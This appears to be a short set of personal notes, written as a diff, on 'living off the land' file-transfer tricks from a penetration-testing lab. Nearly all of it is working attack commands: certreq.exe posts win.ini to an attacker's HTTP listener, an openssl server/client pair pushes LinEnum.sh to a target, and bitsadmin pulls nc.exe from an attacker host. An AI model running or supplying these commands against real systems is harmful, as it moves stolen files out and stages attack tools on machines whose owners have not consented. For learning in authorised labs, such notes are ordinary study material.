@@ -1,0 +1,17 @@
+LIVING OF THE LAND::
+
+Upload win.ini to evv machine:
+	certreq.exe -Post -config http://192.168.49.128:8000/ c\windows\win.ini
+// this will send the file to our Netcat session
+####################################################################################
+Creat ssl certificate :
+	openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+	// stand up a server in evv machine
+	openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+	//download file from the wanted machine
+	openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+#####################################################################################
+Other common LOL n be used to download files from HTTP sites and Stools:
+Bitsadmin Download function :
+// can be used to download files from HTTP sites and SMB shares
+	bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C\Users\htb-student\Desktop\nc.exe
